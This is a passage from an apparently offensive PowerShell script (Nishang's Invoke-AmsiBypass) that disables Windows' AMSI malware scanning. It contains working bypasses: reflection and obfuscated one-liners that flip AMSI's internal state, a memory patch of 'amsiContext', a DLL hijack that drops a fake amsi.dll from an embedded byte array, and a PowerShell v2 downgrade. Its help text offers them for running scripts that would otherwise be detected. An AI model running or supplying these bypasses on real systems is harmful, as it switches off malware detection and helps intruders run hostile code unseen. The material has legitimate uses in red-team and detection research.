                [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
            }
        }

        "unloadobfuscated"
        {
            Write-Verbose "Using Matt Graeber's Reflection method with obfuscation from Daneil Bohannon's Invoke-Obfuscation - which bypasses WMF5 autologging."
            if ($ShowOnly -eq $True)
            {
                $code = @" 
Sv  ('R9'+'HYt') ( " ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI"  );  Invoke-Expression( -Join ( VaRIAbLe  ('R9'+'hyT')  -val  )[ - 1..- (( VaRIAbLe  ('R9'+'hyT')  -val  ).Length)])
"@
                Write-Output "Use the following scriptblock before you run a script which gets detected."
                Write-Output $code
            }
            else
            {
                Write-Output "Executing the bypass."
                Sv  ('R9'+'HYt') ( " ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI"  );  Invoke-Expression( -Join ( VaRIAbLe  ('R9'+'hyT')  -val  )[ - 1..- (( VaRIAbLe  ('R9'+'hyT')  -val  ).Length)])

            }
        }

        "unload2"
        {
            Write-Verbose "Using Matt Graeber's second Reflection method."
            if ($ShowOnly -eq $True)
            {
                Write-Output "Use the following scriptblock before you run a script which gets detected."
                Write-Output '[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiContext'',[Reflection.BindingFlags]''NonPublic,Static'').GetValue($null),0x41414141)'
            }
            else
            {
                Write-Output "Executing the bypass."
                [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
            }
        }

        "dllhijack"
        {
            Write-Verbose "Using Cornelis de Plaa's DLL hijack method."
            if ($ShowOnly -eq $True)
            {
                Write-Output "Copy powershell.exe from C:\Windows\System32\WindowsPowershell\v1.0 to a local folder and dropa fake amsi.dll in the same directory."
                Write-Output "Run the new powershell.exe and AMSI should be gone for that session."
            }
            else
            {
                [Byte[]] $temp = $DllBytes -split ' '                
                Write-Output "Executing the bypass."
                Write-Verbose "Dropping the fake amsi.dll to disk."
                [System.IO.File]::WriteAllBytes("$pwd\amsi.dll", $temp)

                Write-Verbose "Copying powershell.exe to the current working directory."
                Copy-Item -Path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Destination $pwd

                Write-Verbose "Starting powershell.exe from the current working directory."
                & "$pwd\powershell.exe"

            }
        }

        "psv2"
        {
            Write-Verbose "Using PowerShell version 2 which doesn't support AMSI."
            if ($ShowOnly -eq $True)
            {
                Write-Output "If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process."
            }
            else
            {
                Write-Verbose "Checking if .Net version 2.0.50727 is installed."
                $versions = Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\p{L}'} | Select -ExpandProperty Version
                if($versions -match "2.0.50727")
                {
                    Write-Verbose ".Net version 2.0.50727 found."
                    Write-Output "Executing the bypass."
                    powershell.exe -version 2
                }
                else
                {
                    Write-Verbose ".Net version 2.0.50727 not found. Can't start PowerShell v2."
                }
            }
        }
        
        "obfuscation"
        {
            Write-Output "AMSI and the AVs which support it can be bypassed using obfuscation techqniues."
            Write-Output "ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/) and Invoke-Obfuscation can be used (https://github.com/danielbohannon/Invoke-Obfuscation)."
        }
    }

}

function Invoke-AmsiBypass
{
<#
.SYNOPSIS
Nishang script which uses publicly known methods to bypass/avoid AMSI.

.DESCRIPTION
This script implements publicly known methods bypass or avoid AMSI on Windows machines.

AMSI is a script malware detection mechanism enabled by default in Windows 10. 
(https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx)

This script implements 6 methods of bypassing AMSI.
unload - Method by Matt Graeber. Unloads AMSI from current PowerShell session.
unload2 - Another method by Matt Graeber. Unloads AMSI from current PowerShell session.
unloadsilent - Another method by Matt Graeber. Unloads AMSI and avoids WMF5 autologging.
unloadobfuscated - 'unload' method above obfuscated with Daneil Bohannon's Invoke-Obfuscation - which avoids WMF5 autologging. 
dllhijack - Method by Cornelis de Plaa. The amsi.dll used in the code is from p0wnedshell (https://github.com/Cn33liz/p0wnedShell) 
psv2 - If .net 2.0.50727 is available on Windows 10. PowerShell v2 is launched which doesn't support AMSI.

The script also provides information on tools which can be used for obfuscation:
ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/)
Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation)

.PARAMETER Method
The method to be used for elevation. Defaut one is unloadsilent.

.PARAMETER ShowOnly
The bypass is not executed. Just shown to the user. 

.EXAMPLE
PS > Invoke-AmsiBypass -Verbose
Above command runs the unloadsilent method.

.EXAMPLE
PS > Invoke-PsUACme -Method unloadobfuscated -Verbose
Above command runs the unloadobfuscated method.

.LINK
http://www.labofapenetrationtester.com/2016/09/amsi.html
https://github.com/samratashok/nishang
#>
    
    
    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $False)]
        [ValidateSet("unload","unloadsilent","unloadobfuscated","unload2","dllhijack","psv2","obfuscation")]
        [String]
        $Method = "unloadsilent",
       
        [Parameter(Position = 1, Mandatory = $False)]
        [Switch]
        $ShowOnly
    )

    $AmsiX86 = "77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 0 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 190 171 71 149 250 202 41 198 250 202 41 198 250 202 41 198 243 178 186 198 248 202 41 198 148 145 40 199 249 202 41 198 148 145 42 199 251 202 41 198 148 145 44 199 242 202 41 198 148 145 45 199 241 202 41 198 39 53 226 198 248 202 41 198 250 202 40 198 231 202 41 198 40 145 33 199 251 202 41 198 40 145 214 198 251 202 41 198 40 145 43 199 251 202 41 198 82 105 99 104 250 202 41 198 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 76 1 6 0 144 29 62 87 0 0 0 0 0 0 0 0 224 0 2 33 11 1 14 0 0 14 0 0 0 18 0 0 0 0 0 0 43 19 0 0 0 16 0 0 0 32 0 0 0 0 0 16 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 112 0 0 0 4 0 0 0 0 0 0 2 0 64 1 0 0 16 0 0 16 0 0 0 0 16 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 148 36 0 0 80 0 0 0 0 80 0 0 224 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 96 0 0 44 1 0 0 176 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 33 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 124 12 0 0 0 16 0 0 0 14 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 220 7 0 0 0 32 0 0 0 8 0 0 0 18 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 136 3 0 0 0 48 0 0 0 2 0 0 0 26 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 103 102 105 100 115 0 0 20 0 0 0 0 64 0 0 0 2 0 0 0 28 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 80 0 0 0 2 0 0 0 30 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 44 1 0 0 0 96 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 194 12 0 59 13 4 48 0 16 242 117 2 242 195 242 233 96 3 0 0 85 139 236 139 69 12 131 232 0 116 51 131 232 1 116 32 131 232 1 116 17 131 232 1 116 5 51 192 64 235 48 232 245 4 0 0 235 5 232 207 4 0 0 15 182 192 235 31 255 117 16 255 117 8 232 24 0 0 0 89 235 16 131 125 16 0 15 149 192 15 182 192 80 232 23 1 0 0 89 93 194 12 0 106 16 104 24 36 0 16 232 123 9 0 0 106 0 232 35 5 0 0 89 132 192 117 7 51 192 233 224 0 0 0 232 40 4 0 0 136 69 227 179 1 136 93 231 131 101 252 0 131 61 60 51 0 16 0 116 7 106 7 232 203 7 0 0 199 5 60 51 0 16 1 0 0 0 232 74 4 0 0 132 192 116 101 232 206 8 0 0 104 186 25 0 16 232 177 6 0 0 232 93 7 0 0 199 4 36 57 24 0 16 232 160 6 0 0 232 112 7 0 0 199 4 36 128 32 0 16 104 124 32 0 16 232 78 11 0 0 89 89 133 192 117 41 232 237 3 0 0 132 192 116 32 104 120 32 0 16 104 116 32 0 16 232 42 11 0 0 89 89 199 5 60 51 0 16 2 0 0 0 50 219 136 93 231 199 69 252 254 255 255 255 232 68 0 0 0 132 219 15 133 76 255 255 255 232 52 7 0 0 139 240 131 62 0 116 30 86 232 40 5 0 0 89 132 192 116 19 255 117 12 106 2 255 117 8 139 54 139 206 232 136 8 0 0 255 214 255 5 24 48 0 16 51 192 64 232 201 8 0 0 195 138 93 231 255 117 227 232 131 5 0 0 89 195 106 12 104 56 36 0 16 232 105 8 0 0 161 24 48 0 16 133 192 127 4 51 192 235 79 72 163 24 48 0 16 232 22 3 0 0 136 69 228 131 101 252 0 131 61 60 51 0 16 2 116 7 106 7 232 190 6 0 0 232 180 3 0 0 131 37 60 51 0 16 0 199 69 252 254 255 255 255 232 27 0 0 0 106 0 255 117 8 232 65 5 0 0 89 89 51 201 132 192 15 149 193 139 193 232 78 8 0 0 195 232 164 3 0 0 255 117 228 232 6 5 0 0 89 195 106 12 104 88 36 0 16 232 236 7 0 0 131 101 252 0 139 125 12 131 255 1 116 10 131 255 2 116 5 139 93 8 235 49 255 117 16 87 139 93 8 83 232 218 0 0 0 139 240 137 117 228 133 246 15 132 190 0 0 0 255 117 16 87 83 232 216 253 255 255 139 240 137 117 228 133 246 15 132 167 0 0 0 131 255 1 117 7 83 232 198 9 0 0 89 255 117 16 87 83 232 159 253 255 255 139 240 137 117 228 131 255 1 117 43 133 246 117 30 255 117 16 80 83 232 135 253 255 255 255 117 16 86 83 232 147 253 255 255 255 117 16 86 83 232 116 0 0 0 131 255 1 117 4 133 246 116 4 133 255 117 11 83 232 130 9 0 0 89 133 255 116 5 131 255 3 117 72 255 117 16 87 83 232 98 253 255 255 139 240 137 117 228 133 246 116 53 255 117 16 87 83 232 58 0 0 0 139 240 235 36 139 77 236 139 1 81 255 48 104 22 16 0 16 255 117 16 255 117 12 255 117 8 232 86 2 0 0 131 196 24 195 139 101 232 51 246 137 117 228 199 69 252 254 255 255 255 139 198 232 54 7 0 0 195 85 139 236 86 139 53 160 32 0 16 133 246 117 5 51 192 64 235 18 255 117 16 139 206 255 117 12 255 117 8 232 193 6 0 0 255 214 94 93 194 12 0 85 139 236 131 125 12 1 117 5 232 88 4 0 0 255 117 16 255 117 12 255 117 8 232 177 254 255 255 131 196 12 93 194 12 0 85 139 236 106 0 255 21 40 32 0 16 255 117 8 255 21 0 32 0 16 104 9 4 0 192 255 21 4 32 0 16 80 255 21 8 32 0 16 93 195 85 139 236 129 236 36 3 0 0 106 23 232 234 8 0 0 133 192 116 5 106 2 89 205 41 163 32 49 0 16 137 13 28 49 0 16 137 21 24 49 0 16 137 29 20 49 0 16 137 53 16 49 0 16 137 61 12 49 0 16 102 140 21 56 49 0 16 102 140 13 44 49 0 16 102 140 29 8 49 0 16 102 140 5 4 49 0 16 102 140 37 0 49 0 16 102 140 45 252 48 0 16 156 143 5 48 49 0 16 139 69 0 163 36 49 0 16 139 69 4 163 40 49 0 16 141 69 8 163 52 49 0 16 139 133 220 252 255 255 199 5 112 48 0 16 1 0 1 0 161 40 49 0 16 163 44 48 0 16 199 5 32 48 0 16 9 4 0 192 199 5 36 48 0 16 1 0 0 0 199 5 48 48 0 16 1 0 0 0 106 4 88 107 192 0 199 128 52 48 0 16 2 0 0 0 106 4 88 107 192 0 139 13 4 48 0 16 137 76 5 248 106 4 88 193 224 0 139 13 0 48 0 16 137 76 5 248 104 164 32 0 16 232 225 254 255 255 139 229 93 195 85 139 236 139 69 8 86 139 72 60 3 200 15 183 65 20 141 81 24 3 208 15 183 65 6 107 240 40 3 242 59 214 116 25 139 77 12 59 74 12 114 10 139 66 8 3 66 12 59 200 114 12 131 194 40 59 214 117 234 51 192 94 93 195 139 194 235 249 232 85 7 0 0 133 192 117 3 50 192 195 100 161 24 0 0 0 86 190 64 51 0 16 139 80 4 235 4 59 208 116 16 51 192 139 202 240 15 177 14 133 192 117 240 50 192 94 195 176 1 94 195 232 32 7 0 0 133 192 116 7 232 118 5 0 0 235 5 232 77 7 0 0 176 1 195 106 0 232 207 0 0 0 132 192 89 15 149 192 195 232 97 7 0 0 132 192 117 3 50 192 195 232 85 7 0 0 132 192 117 7 232 76 7 0 0 235 237 176 1 195 232 66 7 0 0 232 61 7 0 0 176 1 195 85 139 236 232 203 6 0 0 133 192 117 24 131 125 12 1 117 18 255 117 16 139 77 20 80 255 117 8 232 136 4 0 0 255 85 20 255 117 28 255 117 24 232 219 6 0 0 89 89 93 195 232 155 6 0 0 133 192 116 12 104 68 51 0 16 232 220 6 0 0 89 195 232 240 6 0 0 133 192 15 132 217 6 0 0 195 106 0 232 221 6 0 0 89 233 215 6 0 0 85 139 236 131 125 8 0 117 7 198 5 92 51 0 16 1 232 186 4 0 0 232 189 6 0 0 132 192 117 4 50 192 93 195 232 176 6 0 0 132 192 117 10 106 0 232 165 6 0 0 89 235 233 176 1 93 195 85 139 236 131 236 12 86 139 117 8 133 246 116 5 131 254 1 117 124 232 31 6 0 0 133 192 116 42 133 246 117 38 104 68 51 0 16 232 80 6 0 0 89 133 192 116 4 50 192 235 87 104 80 51 0 16 232 61 6 0 0 247 216 89 26 192 254 192 235 68 161 4 48 0 16 141 117 244 87 131 224 31 191 68 51 0 16 106 32 89 43 200 131 200 255 211 200 51 5 4 48 0 16 137 69 244 137 69 248 137 69 252 165 165 165 191 80 51 0 16 137 69 244 137 69 248 141 117 244 137 69 252 176 1 165 165 165 95 94 139 229 93 195 106 5 232 6 2 0 0 204 106 8 104 120 36 0 16 232 117 3 0 0 131 101 252 0 184 77 90 0 0 102 57 5 0 0 0 16 117 96 161 60 0 0 16 129 184 0 0 0 16 80 69 0 0 117 79 185 11 1 0 0 102 57 136 24 0 0 16 117 65 139 69 8 185 0 0 0 16 43 193 80 81 232 180 253 255 255 89 89 133 192 116 42 247 64 36 0 0 0 128 117 33 199 69 252 254 255 255 255 176 1 235 31 139 69 236 139 0 51 201 129 56 5 0 0 192 15 148 193 139 193 195 139 101 232 199 69 252 254 255 255 255 50 192 232 59 3 0 0 195 85 139 236 232 11 5 0 0 133 192 116 15 128 125 8 0 117 9 51 192 185 64 51 0 16 135 1 93 195 85 139 236 128 61 92 51 0 16 0 116 6 128 125 12 0 117 18 255 117 8 232 67 5 0 0 255 117 8 232 59 5 0 0 89 89 176 1 93 195 85 139 236 161 4 48 0 16 139 200 51 5 68 51 0 16 131 225 31 255 117 8 211 200 131 248 255 117 7 232 1 5 0 0 235 11 104 68 51 0 16 232 233 4 0 0 89 247 216 89 27 192 247 208 35 69 8 93 195 85 139 236 255 117 8 232 186 255 255 255 247 216 89 27 192 247 216 72 93 195 85 139 236 131 236 20 131 101 244 0 131 101 248 0 161 4 48 0 16 86 87 191 78 230 64 187 190 0 0 255 255 59 199 116 13 133 198 116 9 247 208 163 0 48 0 16 235 102 141 69 244 80 255 21 28 32 0 16 139 69 248 51 69 244 137 69 252 255 21 32 32 0 16 49 69 252 255 21 36 32 0 16 49 69 252 141 69 236 80 255 21 16 32 0 16 139 77 240 141 69 252 51 77 236 51 77 252 51 200 59 207 117 7 185 79 230 64 187 235 16 133 206 117 12 139 193 13 17 71 0 0 193 224 16 11 200 137 13 4 48 0 16 247 209 137 13 0 48 0 16 95 94 139 229 93 195 104 96 51 0 16 255 21 24 32 0 16 195 104 96 51 0 16 232 229 3 0 0 89 195 184 104 51 0 16 195 184 112 51 0 16 195 232 239 255 255 255 139 72 4 131 8 4 137 72 4 232 231 255 255 255 139 72 4 131 8 2 137 72 4 195 184 132 51 0 16 195 85 139 236 129 236 36 3 0 0 83 86 106 23 232 234 3 0 0 133 192 116 5 139 77 8 205 41 51 246 141 133 220 252 255 255 104 204 2 0 0 86 80 137 53 120 51 0 16 232 133 3 0 0 131 196 12 137 133 140 253 255 255 137 141 136 253 255 255 137 149 132 253 255 255 137 157 128 253 255 255 137 181 124 253 255 255 137 189 120 253 255 255 102 140 149 164 253 255 255 102 140 141 152 253 255 255 102 140 157 116 253 255 255 102 140 133 112 253 255 255 102 140 165 108 253 255 255 102 140 173 104 253 255 255 156 143 133 156 253 255 255 139 69 4 137 133 148 253 255 255 141 69 4 137 133 160 253 255 255 199 133 220 252 255 255 1 0 1 0 139 64 252 106 80 137 133 144 253 255 255 141 69 168 86 80 232 252 2 0 0 139 69 4 131 196 12 199 69 168 21 0 0 64 199 69 172 1 0 0 0 137 69 180 255 21 20 32 0 16 86 141 88 255 247 219 141 69 168 137 69 248 141 133 220 252 255 255 26 219 137 69 252 254 195 255 21 40 32 0 16 141 69 248 80 255 21 0 32 0 16 133 192 117 13 15 182 195 247 216 27 192 33 5 120 51 0 16 94 91 139 229 93 195 83 86 190 8 36 0 16 187 8 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 56 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 83 86 190 16 36 0 16 187 16 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 13 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 255 37 112 32 0 16 204 204 204 204 204 104 75 26 0 16 100 255 53 0 0 0 0 139 68 36 16 137 108 36 16 141 108 36 16 43 224 83 86 87 161 4 48 0 16 49 69 252 51 197 80 137 101 232 255 117 248 139 69 252 199 69 252 254 255 255 255 137 69 248 141 69 240 100 163 0 0 0 0 242 195 139 77 240 100 137 13 0 0 0 0 89 95 95 94 91 139 229 93 81 242 195 85 139 236 255 117 20 255 117 16 255 117 12 255 117 8 104 5 16 0 16 104 4 48 0 16 232 203 1 0 0 131 196 24 93 195 85 139 236 131 37 124 51 0 16 0 131 236 44 83 51 219 67 9 29 16 48 0 16 106 10 232 228 1 0 0 133 192 15 132 116 1 0 0 131 101 236 0 51 192 131 13 16 48 0 16 2 51 201 86 87 137 29 124 51 0 16 141 125 212 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 139 69 212 139 77 224 137 69 244 129 241 105 110 101 73 139 69 220 53 110 116 101 108 11 200 139 69 216 53 71 101 110 117 11 200 247 217 106 1 88 26 201 106 0 128 193 1 89 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 116 67 139 69 212 37 240 63 255 15 61 192 6 1 0 116 35 61 96 6 2 0 116 28 61 112 6 2 0 116 21 61 80 6 3 0 116 14 61 96 6 3 0 116 7 61 112 6 3 0 117 17 139 61 128 51 0 16 131 207 1 137 61 128 51 0 16 235 6 139 61 128 51 0 16 131 125 244 7 139 69 224 137 69 228 139 69 220 137 69 248 137 69 232 124 50 106 7 88 51 201 83 15 162 139 243 91 141 93 212 137 3 137 115 4 137 75 8 137 83 12 139 69 216 169 0 2 0 0 137 69 236 139 69 248 116 9 131 207 2 137 61 128 51 0 16 95 94 169 0 0 16 0 116 109 131 13 16 48 0 16 4 199 5 124 51 0 16 2 0 0 0 169 0 0 0 8 116 85 169 0 0 0 16 116 78 51 201 15 1 208 137 69 240 137 85 244 139 69 240 139 77 244 131 224 6 51 201 131 248 6 117 51 133 201 117 47 161 16 48 0 16 131 200 8 199 5 124 51 0 16 3 0 0 0 246 69 236 32 163 16 48 0 16 116 18 131 200 32 199 5 124 51 0 16 5 0 0 0 163 16 48 0 16 51 192 91 139 229 93 195 51 192 57 5 20 48 0 16 15 149 192 195 195 255 37 52 32 0 16 255 37 60 32 0 16 255 37 56 32 0 16 255 37 48 32 0 16 255 37 64 32 0 16 255 37 104 32 0 16 255 37 100 32 0 16 255 37 96 32 0 16 255 37 92 32 0 16 255 37 88 32 0 16 255 37 84 32 0 16 255 37 80 32 0 16 255 37 76 32 0 16 255 37 72 32 0 16 255 37 12 32 0 16 176 1 195 51 192 195 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 27 28 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 48 0 16 112 48 0 16 0 0 0 0 0 0 0 0 144 29 62 87 0 0 0 0 2 0 0 0 61 0 0 0 132 33 0 0 132 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 196 33 0 0 196 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 13 0 0 0 44 2 0 0 216 33 0 0 216 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 92 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 4 48 0 16 128 33 0 16 1 0 0 0 112 32 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 75 26 0 0 82 83 68 83 69 10 117 219 0 114 41 77 133 149 98 78 29 103 122 248 7 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 20 0 0 0 20 0 0 0 1 0 0 0 19 0 0 0 71 67 84 76 0 16 0 0 124 12 0 0 46 116 101 120 116 36 109 110 0 0 0 0 0 32 0 0 112 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 112 32 0 0 4 0 0 0 46 48 48 99 102 103 0 0 116 32 0 0 4 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 120 32 0 0 4 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 124 32 0 0 4 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 128 32 0 0 4 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 132 32 0 0 4 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 136 32 0 0 4 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 140 32 0 0 4 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 144 32 0 0 4 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 160 32 0 0 220 0 0 0 46 114 100 97 116 97 0 0 128 33 0 0 4 0 0 0 46 114 100 97 116 97 36 115 120 100 97 116 97 0 0 0 132 33 0 0 128 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 4 36 0 0 4 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 8 36 0 0 4 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 12 36 0 0 4 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 16 36 0 0 4 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 24 36 0 0 124 0 0 0 46 120 100 97 116 97 36 120 0 0 0 0 148 36 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 208 36 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 228 36 0 0 112 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 84 37 0 0 136 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 24 0 0 0 46 100 97 116 97 0 0 0 24 48 0 0 112 3 0 0 46 98 115 115 0 0 0 0 0 64 0 0 20 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 80 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 80 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 254 255 255 255 0 0 0 0 208 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 110 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 233 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 203 18 0 16 234 18 0 16 0 0 0 0 254 255 255 255 0 0 0 0 216 255 255 255 0 0 0 0 254 255 255 255 215 22 0 16 234 22 0 16 20 37 0 0 0 0 0 0 0 0 0 0 220 37 0 0 48 32 0 0 44 37 0 0 0 0 